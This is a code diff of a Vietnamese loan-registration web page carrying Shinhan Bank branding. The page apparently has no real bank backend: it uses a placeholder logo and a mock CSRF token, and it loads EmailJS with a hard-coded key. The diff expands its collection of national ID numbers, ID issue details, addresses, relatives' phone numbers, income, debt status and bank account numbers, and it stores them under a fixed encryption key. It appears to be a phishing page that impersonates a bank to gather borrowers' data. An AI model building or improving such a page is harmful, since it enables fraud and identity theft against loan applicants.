@@ -15,12 +15,15 @@
         body {
             font-family: 'Roboto', sans-serif;
             background-color: var(--secondary-color);
+            overflow-x: hidden;
         }
         .navbar {
             background-color: var(--primary-color);
         }
         .navbar-brand img {
             height: 50px;
+            max-width: 100%;
+            object-fit: contain;
         }
         .navbar-nav .nav-link {
             color: white !important;
@@ -90,6 +93,7 @@
         .form-control, .form-select {
             font-size: 0.9rem;
             padding: 8px;
+            margin-bottom: 5px;
         }
         .form-control:focus {
             border-color: var(--accent-color);
@@ -153,6 +157,8 @@
         @media (max-width: 768px) {
             .navbar-brand img {
                 height: 40px;
+                max-width: 100%;
+                object-fit: contain;
             }
             .step-indicator {
                 display: none;
@@ -161,19 +167,27 @@
                 font-size: 0.9rem;
             }
             .form-section {
-                padding: 10px;
+                padding: 15px;
             }
-            .form-section h3 {
-                font-size: 1rem;
+            .accordion-body {
+                padding: 12px;
+            }
+            .calculation-table {
+                font-size: 0.75rem;
+                overflow-x: auto;
+                display: block;
+            }
+            .container {
+                padding-left: 12px;
+                padding-right: 12px;
             }
             .btn-primary {
                 width: 100%;
-                margin-bottom: 10px;
+                margin-bottom: 12px;
+                font-size: 0.85rem;
             }
-            .calculation-table {
-                font-size: 0.8rem;
-            }
-            .accordion-button {
+            .form-control, .form-select {
+                font-size: 0.85rem;
                 padding: 10px;
             }
         }
@@ -183,7 +197,7 @@
     <header>
         <nav class="navbar navbar-expand-lg">
             <div class="container">
-                <a class="navbar-brand" href="#"><img src="https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo" alt="Shinhan Bank Logo"></a>
+                <a class="navbar-brand" href="#"><img src="/assets/shinhan-logo.png" onerror="this.src='https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo'" alt="Shinhan Bank Logo"></a>
                 <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                     <span class="navbar-toggler-icon"></span>
                 </button>
@@ -219,7 +233,7 @@
             <h2 class="text-center mb-3">THÔNG TIN ĐĂNG KÝ KHOẢN VAY</h2>
 
             <form id="registrationForm" onsubmit="handleSubmit(event)">
-                <input type="hidden" name="_csrf" value="mock-csrf-token">
+                <input type="hidden" id="csrf" name="_csrf" value="mock-csrf-token">
 
                 <div class="accordion" id="formAccordion">
                     <div class="accordion-item">
@@ -233,19 +247,19 @@
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="fullName" class="form-label">Họ và Tên * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập đầy đủ họ và tên như trên CCCD"></i></label>
-                                        <input type="text" class="form-control" id="fullName" name="fullName" required aria-required="true">
+                                        <input type="text" class="form-control" id="fullName" name="fullName" autocomplete="name" required>
                                         <p id="fullNameError" class="error"></p>
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="dob" class="form-label">Ngày sinh *</label>
-                                        <input type="date" class="form-control" id="dob" name="dob" required aria-required="true">
+                                        <input type="date" class="form-control" id="dob" name="dob" autocomplete="bday" required>
                                         <p id="dobError" class="error"></p>
                                     </div>
                                 </div>
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="gender" class="form-label">Giới tính *</label>
-                                        <select class="form-select" id="gender" name="gender" required aria-required="true">
+                                        <select class="form-select" id="gender" name="gender" autocomplete="sex" required>
                                             <option value="">Chọn giới tính</option>
                                             <option value="Nam">Nam</option>
                                             <option value="Nữ">Nữ</option>
@@ -254,20 +268,39 @@
                                         <p id="genderError" class="error"></p>
                                     </div>
                                     <div class="col-md-6 mb-3">
-                                        <label for="address" class="form-label">Địa chỉ thường trú *</label>
-                                        <input type="text" class="form-control" id="address" name="address" required aria-required="true">
-                                        <p id="addressError" class="error"></p>
+                                        <label for="contactAddress" class="form-label">Địa chỉ thường trú *</label>
+                                        <input type="text" class="form-control" id="contactAddress" name="contactAddress" autocomplete="street-address" required>
+                                        <p id="contactAddressError" class="error"></p>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-md-6 mb-3">
+                                        <label for="hometown" class="form-label">Quê quán *</label>
+                                        <input type="text" class="form-control" id="hometown" name="hometown" required>
+                                        <p id="hometownError" class="error"></p>
+                                    </div>
+                                    <div class="col-md-6 mb-3">
+                                        <label for="nationality" class="form-label">Quốc tịch *</label>
+                                        <input type="text" class="form-control" id="nationality" name="nationality" value="Việt Nam" required>
+                                        <p id="nationalityError" class="error"></p>
                                     </div>
                                 </div>
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="cccd" class="form-label">Số định danh cá nhân (CCCD/CMND) *</label>
-                                        <input type="text" class="form-control" id="cccd" name="cccd" required aria-required="true">
+                                        <input type="text" class="form-control" id="cccd" name="cccd" autocomplete="off" required maxlength="12">
                                         <p id="cccdError" class="error"></p>
                                     </div>
                                     <div class="col-md-6 mb-3">
+                                        <label for="idIssueDate" class="form-label">Ngày cấp *</label>
+                                        <input type="date" class="form-control" id="idIssueDate" name="idIssueDate" required>
+                                        <p id="idIssueDateError" class="error"></p>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-md-6 mb-3">
                                         <label for="issuePlace" class="form-label">Nơi cấp *</label>
-                                        <select class="form-select" id="issuePlace" name="issuePlace" required aria-required="true">
+                                        <select class="form-select" id="issuePlace" name="issuePlace" required>
                                             <option value="">Chọn nơi cấp</option>
                                             <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                                             <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
@@ -280,21 +313,21 @@
                     </div>
                     <div class="accordion-item">
                         <h2 class="accordion-header">
-                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#registrationInfo" aria-expanded="false" aria-controls="registrationInfo">
+                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#registrationInfo" aria-expanded="true" aria-controls="registrationInfo">
                                 THÔNG TIN ĐĂNG KÝ
                             </button>
                         </h2>
-                        <div id="registrationInfo" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
+                        <div id="registrationInfo" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                             <div class="accordion-body">
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="phone" class="form-label">Số điện thoại *</label>
-                                        <input type="tel" class="form-control" id="phone" name="phone" required aria-required="true">
+                                        <input type="tel" class="form-control" id="phone" name="phone" autocomplete="tel" required maxlength="12">
                                         <p id="phoneError" class="error"></p>
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="email" class="form-label">E-mail *</label>
-                                        <input type="email" class="form-control" id="email" name="email" required aria-required="true">
+                                        <input type="email" class="form-control" id="email" name="email" autocomplete="email" required>
                                         <p id="emailError" class="error"></p>
                                         <small class="form-text text-muted">Bạn sẽ nhận thông tin hướng dẫn qua email này.</small>
                                     </div>
@@ -302,7 +335,7 @@
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="loanType" class="form-label">Hình thức vay *</label>
-                                        <select class="form-select" id="loanType" name="loanType" required aria-required="true">
+                                        <select class="form-select" id="loanType" name="loanType" required>
                                             <option value="">Chọn Hình thức vay</option>
                                             <option value="Vay tín chấp">Vay tín chấp</option>
                                             <option value="Vay thế chấp">Vay thế chấp</option>
@@ -313,7 +346,7 @@
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="loanTerm" class="form-label">Thời hạn vay yêu cầu * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Chọn số tháng vay phù hợp"></i></label>
-                                        <select class="form-select" id="loanTerm" name="loanTerm" required aria-required="true">
+                                        <select class="form-select" id="loanTerm" name="loanTerm" required>
                                             <option value="">Chọn số tháng</option>
                                             <option value="6">6 tháng</option>
                                             <option value="12">12 tháng</option>
@@ -329,7 +362,7 @@
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="loanAmount" class="form-label">Số tiền vay yêu cầu (VND) *</label>
-                                        <select class="form-select" id="loanAmount" name="loanAmount" required aria-required="true">
+                                        <select class="form-select" id="loanAmount" name="loanAmount" required>
                                             <option value="">Chọn số tiền</option>
                                             <option value="10000000">10,000,000</option>
                                             <option value="20000000">20,000,000</option>
@@ -352,26 +385,26 @@
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="disbursementDate" class="form-label">Dự kiến giải ngân ngày *</label>
-                                        <input type="date" class="form-control" id="disbursementDate" name="disbursementDate" required aria-required="true">
+                                        <input type="date" class="form-control" id="disbursementDate" name="disbursementDate" autocomplete="off" required>
                                         <p id="disbursementDateError" class="error"></p>
                                     </div>
                                 </div>
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
-                                        <label for="interestRate" class="form-label">Lãi suất (%/năm) * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập lãi suất dự kiến, ví dụ: 7.5"></i></label>
-                                        <input type="number" class="form-control" id="interestRate" name="interestRate" step="0.01" required aria-required="true">
+                                        <label for="interestRate" class="form-label">Lãi suất (%/năm) * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Lãi suất được tự động chọn theo gói vay"></i></label>
+                                        <input type="number" class="form-control" id="interestRate" name="interestRate" step="0.01" required readonly>
                                         <p id="interestRateError" class="error"></p>
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="monthlyIncome" class="form-label">Thu nhập hàng tháng (VND) *</label>
-                                        <input type="number" class="form-control" id="monthlyIncome" name="monthlyIncome" required aria-required="true">
+                                        <input type="number" class="form-control" id="monthlyIncome" name="monthlyIncome" required>
                                         <p id="monthlyIncomeError" class="error"></p>
                                     </div>
                                 </div>
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="occupation" class="form-label">Nghề nghiệp *</label>
-                                        <select class="form-select" id="occupation" name="occupation" required aria-required="true">
+                                        <select class="form-select" id="occupation" name="occupation" required>
                                             <option value="">Chọn nghề nghiệp</option>
                                             <option value="Kỹ sư">Kỹ sư</option>
                                             <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
@@ -386,7 +419,7 @@
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="loanPurpose" class="form-label">Mục đích vay *</label>
-                                        <select class="form-select" id="loanPurpose" name="loanPurpose" required aria-required="true">
+                                        <select class="form-select" id="loanPurpose" name="loanPurpose" required>
                                             <option value="">Chọn mục đích vay</option>
                                             <option value="Mua nhà">Mua nhà</option>
                                             <option value="Mua xe">Mua xe</option>
@@ -402,12 +435,12 @@
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="relativePhone" class="form-label">Số điện thoại người thân *</label>
-                                        <input type="tel" class="form-control" id="relativePhone" name="relativePhone" required aria-required="true">
+                                        <input type="tel" class="form-control" id="relativePhone" name="relativePhone" autocomplete="tel" required maxlength="12">
                                         <p id="relativePhoneError" class="error"></p>
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="relationship" class="form-label">Quan hệ *</label>
-                                        <select class="form-select" id="relationship" name="relationship" required aria-required="true">
+                                        <select class="form-select" id="relationship" name="relationship" required>
                                             <option value="">Chọn quan hệ</option>
                                             <option value="Bạn bè">Bạn bè</option>
                                             <option value="Anh">Anh</option>
@@ -422,32 +455,52 @@
                                         <p id="relationshipError" class="error"></p>
                                     </div>
                                 </div>
+                                <div class="row">
+                                    <div class="col-md-6 mb-3">
+                                        <label for="hasBadDebt" class="form-label">Nợ xấu *</label>
+                                        <select class="form-select" id="hasBadDebt" name="hasBadDebt" required>
+                                            <option value="">Chọn</option>
+                                            <option value="Có">Có</option>
+                                            <option value="Không">Không</option>
+                                        </select>
+                                        <p id="hasBadDebtError" class="error"></p>
+                                    </div>
+                                    <div class="col-md-6 mb-3">
+                                        <label for="hasHighDebt" class="form-label">Nợ chú ý *</label>
+                                        <select class="form-select" id="hasHighDebt" name="hasHighDebt" required>
+                                            <option value="">Chọn</option>
+                                            <option value="Có">Có</option>
+                                            <option value="Không">Không</option>
+                                        </select>
+                                        <p id="hasHighDebtError" class="error"></p>
+                                    </div>
+                                </div>
                             </div>
                         </div>
                     </div>
                     <div class="accordion-item">
                         <h2 class="accordion-header">
-                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#accountInfo" aria-expanded="false" aria-controls="accountInfo">
+                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#accountInfo" aria-expanded="true" aria-controls="accountInfo">
                                 TÀI KHOẢN GIẢI NGÂN
                             </button>
                         </h2>
-                        <div id="accountInfo" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
+                        <div id="accountInfo" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                             <div class="accordion-body">
                                 <div class="row">
                                     <div class="col-md-6 mb-3">
                                         <label for="accountName" class="form-label">Tên chủ tài khoản *</label>
-                                        <input type="text" class="form-control" id="accountName" name="accountName" required aria-required="true">
+                                        <input type="text" class="form-control" id="accountName" name="accountName" autocomplete="name" required>
                                         <p id="accountNameError" class="error"></p>
                                     </div>
                                     <div class="col-md-6 mb-3">
                                         <label for="accountNumber" class="form-label">Số tài khoản *</label>
-                                        <input type="text" class="form-control" id="accountNumber" name="accountNumber" required aria-required="true">
+                                        <input type="text" class="form-control" id="accountNumber" name="accountNumber" autocomplete="off" required maxlength="16">
                                         <p id="accountNumberError" class="error"></p>
                                     </div>
                                 </div>
                                 <div class="mb-3">
                                     <label for="bankName" class="form-label">Tên ngân hàng *</label>
-                                    <select class="form-select" id="bankName" name="bankName" required aria-required="true">
+                                    <select class="form-select" id="bankName" name="bankName" required>
                                         <option value="">Chọn ngân hàng</option>
                                         <option value="Shinhan Bank">Shinhan Bank</option>
                                         <option value="Vietcombank">Vietcombank</option>
@@ -480,11 +533,11 @@
                     </div>
                     <div class="accordion-item">
                         <h2 class="accordion-header">
-                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#calculationResult" aria-expanded="false" aria-controls="calculationResult">
+                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#calculationResult" aria-expanded="true" aria-controls="calculationResult">
                                 KẾT QUẢ TÍNH TOÁN
                             </button>
                         </h2>
-                        <div id="calculationResult" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
+                        <div id="calculationResult" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                             <div class="accordion-body">
                                 <div id="calculationSummary" class="mb-3">
                                     <p>Số tiền vay: <span id="calcLoanAmount">0</span> VND</p>
@@ -511,7 +564,7 @@
                 </div>
 
                 <div class="form-check mb-3">
-                    <input class="form-check-input" type="checkbox" id="privacyConsent" required aria-required="true">
+                    <input class="form-check-input" type="checkbox" id="privacyConsent" name="privacyConsent" required>
                     <label class="form-check-label" for="privacyConsent">
                         Tôi đồng ý với <a href="#" target="_blank">Chính sách bảo mật</a> và <a href="#" target="_blank">Điều khoản sử dụng</a>.
                     </label>
@@ -560,21 +613,53 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
     <script>
         // Initialize EmailJS
-        emailjs.init("OrBsI926QI2_xBh1f");
+        try {
+            emailjs.init("OrBsI926QI2_xBh1f");
+            console.log('EmailJS initialized successfully');
+        } catch (error) {
+            console.error('EmailJS initialization failed:', error);
+            alert('Lỗi khởi tạo EmailJS. Vui lòng thử lại sau.');
+        }
 
         let userData = {};
         let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
 
-        // Initialize tooltips and input masks
+        // Initialize tooltips, input masks, and default disbursement date
         $(document).ready(function(){
             $('[data-bs-toggle="tooltip"]').tooltip();
             $('#phone').mask('0000 000 000');
             $('#relativePhone').mask('0000 000 000');
             $('#cccd').mask('000000000000');
             $('#accountNumber').mask('0000000000000000');
+            const today = new Date().toISOString().split('T')[0];
+            document.getElementById('disbursementDate').value = today;
+            // Set default interest rate on page load
+            updateInterestRate();
+        });
+
+        // Auto-select interest rate based on loan type
+        const updateInterestRate = () => {
+            const loanType = document.getElementById('loanType').value || userData.loanType || '';
+            const interestRate = document.getElementById('interestRate');
+            const rates = {
+                'Vay tín chấp': 7.8,
+                'Vay thế chấp': 6.2,
+                'Vay thấu chi': 8.5,
+                'Vay trả góp': 7.2
+            };
+            const rate = rates[loanType] || 7.0; // Default to 7.0 if no loanType selected
+            interestRate.value = rate.toFixed(2);
+            console.log(`Interest rate set to ${rate}% for ${loanType || 'default'}`);
+            interestRate.dispatchEvent(new Event('change'));
+        };
+
+        document.getElementById('loanType').addEventListener('change', updateInterestRate);
+
+        document.getElementById('interestRate').addEventListener('change', function() {
+            this.value = parseFloat(this.value).toFixed(2);
         });
 
         // Check for existing registration
@@ -583,16 +668,19 @@
             if (localStorage.getItem('registered')) {
                 document.getElementById('blockMessage').style.display = 'block';
                 document.getElementById('registrationContent').style.display = 'none';
+                console.log('Existing registration detected');
                 return;
             }
+            // Ensure interest rate is set after loading user data
+            updateInterestRate();
         };
 
         function getCurrentDate() {
             const today = new Date();
-            const day = String(today.getDate()).padStart(2, '0');
-            const month = String(today.getMonth() + 1).padStart(2, '0');
             const year = today.getFullYear();
-            return `${day}/${month}/${year}`;
+            const month = String(today.getMonth() + 1).padStart(2, '0');
+            const day = String(today.getDate()).padStart(2, '0');
+            return `${year}-${month}-${day}`;
         }
 
         function checkLocalStorageQuota() {
@@ -602,16 +690,14 @@
                 localStorage.removeItem(testKey);
                 return true;
             } catch (e) {
-                console.error('LocalStorage quota exceeded');
+                console.error('LocalStorage quota exceeded:', e);
                 alert('Dung lượng lưu trữ trình duyệt đã đầy. Vui lòng xóa dữ liệu trình duyệt.');
                 return false;
             }
         }
 
         function saveToLocalStorage() {
-            if (!checkLocalStorageQuota()) {
-                return false;
-            }
+            if (!checkLocalStorageQuota()) return false;
             try {
                 const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                 localStorage.setItem('userData', encryptedData);
@@ -634,12 +720,14 @@
                         document.getElementById('blockMessage').style.display = 'block';
                         document.getElementById('registrationContent').style.display = 'none';
                     } else {
-                        // Load saved data into form
                         document.getElementById('fullName').value = userData.fullName || '';
                         document.getElementById('dob').value = userData.dob || '';
                         document.getElementById('gender').value = userData.gender || '';
-                        document.getElementById('address').value = userData.address || '';
+                        document.getElementById('contactAddress').value = userData.contactAddress || '';
+                        document.getElementById('hometown').value = userData.hometown || '';
+                        document.getElementById('nationality').value = userData.nationality || 'Việt Nam';
                         document.getElementById('cccd').value = userData.cccd || '';
+                        document.getElementById('idIssueDate').value = userData.idIssueDate || '';
                         document.getElementById('issuePlace').value = userData.issuePlace || '';
                         document.getElementById('phone').value = userData.phone || '';
                         document.getElementById('email').value = userData.email || '';
@@ -647,47 +735,61 @@
                         document.getElementById('loanTerm').value = userData.loanTerm || '';
                         document.getElementById('loanAmount').value = userData.loanAmount || '';
                         document.getElementById('disbursementDate').value = userData.disbursementDate || getCurrentDate();
-                        document.getElementById('interestRate').value = userData.interestRate || '';
+                        document.getElementById('interestRate').value = userData.interestRate || '7.00';
                         document.getElementById('monthlyIncome').value = userData.monthlyIncome || '';
                         document.getElementById('occupation').value = userData.occupation || '';
                         document.getElementById('loanPurpose').value = userData.loanPurpose || '';
                         document.getElementById('relativePhone').value = userData.relativePhone || '';
                         document.getElementById('relationship').value = userData.relationship || '';
+                        document.getElementById('hasBadDebt').value = userData.hasBadDebt || '';
+                        document.getElementById('hasHighDebt').value = userData.hasHighDebt || '';
                         document.getElementById('accountName').value = userData.accountName || '';
                         document.getElementById('accountNumber').value = userData.accountNumber || '';
                         document.getElementById('bankName').value = userData.bankName || '';
+                        updateInterestRate(); // Ensure interest rate is updated after loading
                     }
+                } else {
+                    // If no userData, set default interest rate
+                    updateInterestRate();
                 }
             } catch (error) {
                 console.error('Error loading userData from localStorage:', error);
+                // Fallback to default interest rate on error
+                updateInterestRate();
             }
         }
 
         function validateForm() {
             let isValid = true;
+            let errorMessages = [];
             const fields = [
-                { id: 'fullName', errorId: 'fullNameError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập đầy đủ họ và tên.' },
-                { id: 'dob', errorId: 'dobError', validate: value => value && new Date(value) <= new Date(), message: 'Ngày sinh phải hợp lệ và không phải tương lai.' },
+                { id: 'fullName', errorId: 'fullNameError', validate: value => value.trim().length > 2, message: 'Họ và tên phải trên 2 ký tự.' },
+                { id: 'dob', errorId: 'dobError', validate: value => value && new Date(value) <= new Date() && new Date(value) >= new Date('1900-01-01'), message: 'Ngày sinh phải hợp lệ (1900 trở đi, không phải tương lai).' },
                 { id: 'gender', errorId: 'genderError', validate: value => value !== '', message: 'Vui lòng chọn giới tính.' },
-                { id: 'address', errorId: 'addressError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập địa chỉ chi tiết.' },
-                { id: 'cccd', errorId: 'cccdError', validate: value => /^\d{12}$/.test(value), message: 'Số CCCD phải có đúng 12 chữ số.' },
+                { id: 'contactAddress', errorId: 'contactAddressError', validate: value => value.trim().length > 5, message: 'Địa chỉ thường trú phải chi tiết (trên 5 ký tự).' },
+                { id: 'hometown', errorId: 'hometownError', validate: value => value.trim().length > 5, message: 'Quê quán phải chi tiết (trên 5 ký tự).' },
+                { id: 'nationality', errorId: 'nationalityError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập quốc tịch.' },
+                { id: 'cccd', errorId: 'cccdError', validate: value => /^\d{12}$/.test(value), message: 'CCCD phải đúng 12 chữ số.' },
+                { id: 'idIssueDate', errorId: 'idIssueDateError', validate: value => value && new Date(value) <= new Date(), message: 'Ngày cấp phải hợp lệ và không phải tương lai.' },
                 { id: 'issuePlace', errorId: 'issuePlaceError', validate: value => value !== '', message: 'Vui lòng chọn nơi cấp CCCD.' },
-                { id: 'phone', errorId: 'phoneError', validate: value => /^\d{10}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại phải có đúng 10 chữ số.' },
-                { id: 'email', errorId: 'emailError', validate: value => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value), message: 'Email không hợp lệ, ví dụ: example@domain.com.' },
+                { id: 'phone', errorId: 'phoneError', validate: value => /^\d{10}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại phải đúng 10 chữ số.' },
+                { id: 'email', errorId: 'emailError', validate: value => /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value), message: 'Email không hợp lệ (ví dụ: example@domain.com).' },
                 { id: 'loanType', errorId: 'loanTypeError', validate: value => value !== '', message: 'Vui lòng chọn hình thức vay.' },
                 { id: 'loanTerm', errorId: 'loanTermError', validate: value => value !== '', message: 'Vui lòng chọn thời hạn vay.' },
                 { id: 'loanAmount', errorId: 'loanAmountError', validate: value => value !== '' && value !== 'other', message: 'Vui lòng chọn số tiền vay hợp lệ.' },
-                { id: 'disbursementDate', errorId: 'disbursementDateError', validate: value => value && new Date(value) >= new Date(), message: 'Ngày giải ngân phải từ hôm nay trở đi.' },
-                { id: 'interestRate', errorId: 'interestRateError', validate: value => value > 0 && value <= 20, message: 'LAMD suất phải từ 0.01 đến 20%.' },
-                { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validate: value => value >= 1000000, message: 'Thu nhập phải từ 1,000,000 VND trở lên.' },
+                { id: 'disbursementDate', errorId: 'disbursementDateError', validate: value => value && new Date(value) >= new Date().setHours(0, 0, 0, 0), message: 'Ngày giải ngân phải từ hôm nay trở đi.' },
+                { id: 'interestRate', errorId: 'interestRateError', validate: value => value >= 5 && value <= 10, message: 'Lãi suất phải từ 5% đến 10%.' },
+                { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validate: value => value >= 3000000, message: 'Thu nhập phải từ 3,000,000 VND.' },
                 { id: 'occupation', errorId: 'occupationError', validate: value => value !== '', message: 'Vui lòng chọn nghề nghiệp.' },
                 { id: 'loanPurpose', errorId: 'loanPurposeError', validate: value => value !== '', message: 'Vui lòng chọn mục đích vay.' },
-                { id: 'relativePhone', errorId: 'relativePhoneError', validate: value => /^\d{10}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại người thân phải có đúng 10 chữ số.' },
+                { id: 'relativePhone', errorId: 'relativePhoneError', validate: value => /^\d{10}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại người thân phải đúng 10 chữ số.' },
                 { id: 'relationship', errorId: 'relationshipError', validate: value => value !== '', message: 'Vui lòng chọn quan hệ.' },
-                { id: 'accountName', errorId: 'accountNameError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập tên chủ tài khoản.' },
+                { id: 'hasBadDebt', errorId: 'hasBadDebtError', validate: value => value !== '', message: 'Vui lòng chọn tình trạng nợ xấu.' },
+                { id: 'hasHighDebt', errorId: 'hasHighDebtError', validate: value => value !== '', message: 'Vui lòng chọn tình trạng nợ chú ý.' },
+                { id: 'accountName', errorId: 'accountNameError', validate: value => value.trim().length > 2, message: 'Tên chủ tài khoản phải trên 2 ký tự.' },
                 { id: 'accountNumber', errorId: 'accountNumberError', validate: value => /^\d{10,20}$/.test(value.replace(/\s/g, '')), message: 'Số tài khoản phải từ 10 đến 20 chữ số.' },
                 { id: 'bankName', errorId: 'bankNameError', validate: value => value !== '', message: 'Vui lòng chọn ngân hàng.' },
-                { id: 'privacyConsent', errorId: 'privacyConsentError', validate: value => value === true, message: 'Vui lòng đồng ý với chính sách bảo mật.' }
+                { id: 'privacyConsent', errorId: 'privacyConsentError', validate: value => value === true, message: 'Vui lòng đồng ý chính sách bảo mật.' }
             ];
 
             fields.forEach(field => {
@@ -696,16 +798,24 @@
                 const errorElement = document.getElementById(field.errorId);
                 if (!field.validate(value)) {
                     errorElement.textContent = field.message;
+                    errorMessages.push(field.message);
+                    console.error(`Validation failed for ${field.id}: ${field.message}`);
                     isValid = false;
                 } else {
                     errorElement.textContent = '';
                 }
             });
 
-            // Check for existing registration
             if (isValid && registeredUsers.includes(document.getElementById('cccd').value)) {
-                alert('CCCD này đã được sử dụng để đăng ký hồ sơ. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.');
+                const duplicateMessage = 'CCCD này đã được sử dụng để đăng ký hồ sơ. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.';
+                alert(duplicateMessage);
+                console.error('Duplicate CCCD detected:', document.getElementById('cccd').value);
+                errorMessages.push(duplicateMessage);
                 isValid = false;
+            }
+
+            if (!isValid && errorMessages.length > 0) {
+                alert('Vui lòng kiểm tra các lỗi sau:\n- ' + errorMessages.join('\n- '));
             }
 
             return isValid;
@@ -764,27 +874,32 @@
 
         function saveFormDataRealTime() {
             userData = {
-                fullName: document.getElementById('fullName').value.trim(),
-                dob: document.getElementById('dob').value,
-                gender: document.getElementById('gender').value,
-                address: document.getElementById('address').value.trim(),
-                cccd: document.getElementById('cccd').value.trim(),
-                issuePlace: document.getElementById('issuePlace').value,
-                phone: document.getElementById('phone').value.trim(),
-                email: document.getElementById('email').value.trim(),
-                loanType: document.getElementById('loanType').value,
-                loanTerm: document.getElementById('loanTerm').value,
-                loanAmount: document.getElementById('loanAmount').value,
-                disbursementDate: document.getElementById('disbursementDate').value,
+                fullName: document.getElementById('fullName').value.trim() || 'N/A',
+                dob: document.getElementById('dob').value || 'N/A',
+                gender: document.getElementById('gender').value || 'N/A',
+                contactAddress: document.getElementById('contactAddress').value.trim() || 'N/A',
+                hometown: document.getElementById('hometown').value.trim() || 'N/A',
+                nationality: document.getElementById('nationality').value.trim() || 'Việt Nam',
+                cccd: document.getElementById('cccd').value.trim() || 'N/A',
+                idIssueDate: document.getElementById('idIssueDate').value || 'N/A',
+                issuePlace: document.getElementById('issuePlace').value || 'N/A',
+                phone: document.getElementById('phone').value.trim() || 'N/A',
+                email: document.getElementById('email').value.trim() || 'N/A',
+                loanType: document.getElementById('loanType').value || 'N/A',
+                loanTerm: document.getElementById('loanTerm').value || 'N/A',
+                loanAmount: document.getElementById('loanAmount').value || 'N/A',
+                disbursementDate: document.getElementById('disbursementDate').value || getCurrentDate(),
                 interestRate: parseFloat(document.getElementById('interestRate').value) || 0,
                 monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value) || 0,
-                occupation: document.getElementById('occupation').value,
-                loanPurpose: document.getElementById('loanPurpose').value,
-                relativePhone: document.getElementById('relativePhone').value.trim(),
-                relationship: document.getElementById('relationship').value,
-                accountName: document.getElementById('accountName').value.trim(),
-                accountNumber: document.getElementById('accountNumber').value.trim(),
-                bankName: document.getElementById('bankName').value,
+                occupation: document.getElementById('occupation').value || 'N/A',
+                loanPurpose: document.getElementById('loanPurpose').value || 'N/A',
+                relativePhone: document.getElementById('relativePhone').value.trim() || 'N/A',
+                relationship: document.getElementById('relationship').value || 'N/A',
+                hasBadDebt: document.getElementById('hasBadDebt').value || 'N/A',
+                hasHighDebt: document.getElementById('hasHighDebt').value || 'N/A',
+                accountName: document.getElementById('accountName').value.trim() || 'N/A',
+                accountNumber: document.getElementById('accountNumber').value.trim() || 'N/A',
+                bankName: document.getElementById('bankName').value || 'N/A',
